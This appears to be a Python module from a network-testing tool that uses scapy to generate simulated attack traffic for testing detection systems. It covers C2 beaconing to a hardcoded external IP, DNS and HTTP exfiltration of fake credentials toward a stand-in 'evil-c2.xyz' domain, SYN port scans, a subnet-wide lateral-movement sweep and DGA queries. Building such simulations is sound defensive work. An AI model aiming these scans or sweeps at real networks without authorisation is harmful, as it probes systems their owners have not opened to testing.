"""
NetRunner OS - Adversary Traffic Simulations
Generates malicious-looking traffic for NDR detection testing.
"""

import time
import random
import string
import hashlib
from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
    sendp, get_if_hwaddr, RandShort
)
from app.core.engine import active_task_status, log_message


def generate(params):
    """Dispatch to the appropriate adversary simulation."""
    sim = params.get('simulation', 'c2_beacon').lower()
    simulations = {
        'c2_beacon': _sim_c2_beacon,
        'dns_exfil': _sim_dns_exfil,
        'port_scan': _sim_port_scan,
        'lateral_movement': _sim_lateral_movement,
        'http_exfil': _sim_http_exfil,
        'dga': _sim_dga,
    }

    sim_func = simulations.get(sim)
    if not sim_func:
        log_message(f"[!] Unknown simulation: {sim}")
        active_task_status['is_running'] = False
        return

    try:
        log_message(f"[*] Starting adversary simulation: {sim}")
        sim_func(params)
    except Exception as e:
        log_message(f"[!!!] Simulation error: {e}")
        active_task_status['error'] = str(e)
    finally:
        active_task_status['is_running'] = False
        active_task_status['packets_per_second'] = 0
        log_message(f"[+] {sim} simulation finished.")


def _base_packet(params):
    iface = params['interface']
    src_mac = params.get('src_mac') or get_if_hwaddr(iface)
    dst_mac = params.get('dst_mac', 'ff:ff:ff:ff:ff:ff')
    return Ether(src=src_mac, dst=dst_mac)


def _send_with_tracking(packets, params, delay_override=None):
    iface = params['interface']
    delay = delay_override if delay_override is not None else params.get('delay', 1.0)
    total = len(packets)
    active_task_status['total'] = total

    pps_start = time.time()
    pps_count = 0

    for i, pkt in enumerate(packets):
        if not active_task_status['is_running']:
            log_message("[!] Stop signal received.")
            break

        sendp(pkt, iface=iface, verbose=0)
        active_task_status['progress'] = i + 1
        active_task_status['message'] = f"Simulation packet {i+1}/{total}"

        pps_count += 1
        if time.time() - pps_start >= 1.0:
            active_task_status['packets_per_second'] = pps_count
            pps_count = 0
            pps_start = time.time()

        if delay > 0:
            time.sleep(delay)


# ── C2 Beaconing ─────────────────────────────────────────────────────────────

def _sim_c2_beacon(params):
    """Simulate C2 beaconing: periodic HTTPS callbacks with jitter."""
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 50)
    base_interval = params.get('delay', 5.0)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    C2 Server: {c2_host}")
    log_message(f"    Beacon interval: ~{base_interval}s with jitter")
    log_message(f"    Beacon count: {count}")

    packets = []
    for i in range(count):
        sport = random.randint(49152, 65535)
        # SYN to C2
        packets.append(base / IP(src=src_ip, dst=c2_host) / TCP(sport=sport, dport=443, flags='S'))
        # Simulate TLS Client Hello (stub)
        tls_hello = b'\x16\x03\x01\x00\xf1\x01\x00\x00\xed\x03\x03' + os.urandom(32)
        packets.append(base / IP(src=src_ip, dst=c2_host) / TCP(sport=sport, dport=443, flags='PA') / Raw(load=tls_hello))
        # Small response (beacon ack)
        packets.append(base / IP(src=c2_host, dst=src_ip) / TCP(sport=443, dport=sport, flags='PA') / Raw(load=os.urandom(random.randint(64, 256))))

    # Add jitter to delays
    _send_with_tracking(packets, params, delay_override=None)


# ── DNS Exfiltration ─────────────────────────────────────────────────────────

def _sim_dns_exfil(params):
    """Simulate data exfiltration over DNS using encoded subdomains."""
    domain = params.get('domain', 'evil-c2.xyz')
    count = params.get('count', 30)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    log_message(f"    Exfil domain: {domain}")
    log_message(f"    Encoding fake data into DNS queries")

    # Simulate encoding stolen data into DNS queries
    fake_data = "CONFIDENTIAL:username=admin;password=P@ssw0rd;ssn=123-45-6789;cc=4111111111111111"
    chunks = [fake_data[i:i+30] for i in range(0, len(fake_data), 30)]

    packets = []
    for i in range(count):
        # Encode chunk as hex subdomain
        chunk = chunks[i % len(chunks)]
        encoded = chunk.encode().hex()
        query_name = f"{encoded}.{i}.data.{domain}"

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=query_name, qtype="TXT")))
        packets.append(pkt)
        log_message(f"    DNS Exfil query: {query_name[:60]}...")

    _send_with_tracking(packets, params, delay_override=0.2)


# ── Port Scanning ────────────────────────────────────────────────────────────

def _sim_port_scan(params):
    """Simulate SYN port scan across common ports."""
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    common_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
        993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 8888
    ]

    log_message(f"    Target: {dst_ip}")
    log_message(f"    Scanning {len(common_ports)} common ports")

    packets = []
    sport = random.randint(40000, 60000)
    for port in common_ports:
        pkt = base / IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=port, flags='S')
        packets.append(pkt)
        sport += 1

    _send_with_tracking(packets, params, delay_override=0.05)


# ── Lateral Movement ─────────────────────────────────────────────────────────

def _sim_lateral_movement(params):
    """Simulate lateral movement: SMB/WinRM/RDP attempts across a subnet."""
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    # Generate a /24 subnet from dst_ip
    octets = dst_ip.split('.')
    subnet_prefix = '.'.join(octets[:3])

    lateral_ports = {
        445: "SMB",
        5985: "WinRM",
        3389: "RDP",
        135: "RPC",
        22: "SSH"
    }

    log_message(f"    Source: {src_ip}")
    log_message(f"    Target subnet: {subnet_prefix}.0/24")
    log_message(f"    Protocols: {', '.join(lateral_ports.values())}")

    packets = []
    targets = random.sample(range(1, 255), min(20, 254))
    for host in targets:
        target = f"{subnet_prefix}.{host}"
        for port, proto_name in lateral_ports.items():
            sport = random.randint(49152, 65535)
            pkt = base / IP(src=src_ip, dst=target) / TCP(sport=sport, dport=port, flags='S')
            packets.append(pkt)
        if not active_task_status['is_running']:
            break

    log_message(f"    Total connection attempts: {len(packets)}")
    _send_with_tracking(packets, params, delay_override=0.02)


# ── HTTP Data Exfiltration ───────────────────────────────────────────────────

def _sim_http_exfil(params):
    """Simulate data exfiltration via large HTTP POST requests."""
    c2_host = params.get('c2_host', '185.100.87.42')
    count = params.get('count', 10)
    src_ip = params['src_ip']
    base = _base_packet(params)

    log_message(f"    Exfil target: {c2_host}")
    log_message(f"    Sending {count} large POST requests")

    packets = []
    for i in range(count):
        # Generate fake exfil payload
        fake_data = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1000, 4000)))
        sport = random.randint(49152, 65535)

        http_post = (
            f"POST /upload/data_{i} HTTP/1.1\r\n"
            f"Host: {c2_host}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(fake_data)}\r\n"
            f"X-Session: {hashlib.md5(str(i).encode()).hexdigest()}\r\n\r\n"
            f"{fake_data}"
        )

        pkt = base / IP(src=src_ip, dst=c2_host) / TCP(sport=sport, dport=80, flags='PA') / Raw(load=http_post.encode())
        packets.append(pkt)
        log_message(f"    Exfil POST #{i+1}: {len(fake_data)} bytes")

    _send_with_tracking(packets, params, delay_override=0.5)


# ── DGA Traffic ──────────────────────────────────────────────────────────────

def _sim_dga(params):
    """Simulate Domain Generation Algorithm traffic."""
    count = params.get('count', 50)
    src_ip = params['src_ip']
    dst_ip = params['dst_ip']
    base = _base_packet(params)

    tlds = ['.xyz', '.top', '.club', '.info', '.online', '.site', '.tk', '.pw']

    log_message(f"    Generating {count} DGA domains")

    packets = []
    seed = int(time.time())
    for i in range(count):
        # Simple DGA: hash-based domain generation
        h = hashlib.md5(f"{seed}_{i}".encode()).hexdigest()
        domain_len = random.randint(8, 16)
        dga_domain = h[:domain_len] + random.choice(tlds)

        pkt = (base / IP(src=src_ip, dst=dst_ip) /
               UDP(sport=RandShort(), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=dga_domain)))
        packets.append(pkt)
        log_message(f"    DGA query: {dga_domain}")

    _send_with_tracking(packets, params, delay_override=0.1)


# Need os for urandom in c2_beacon
import os
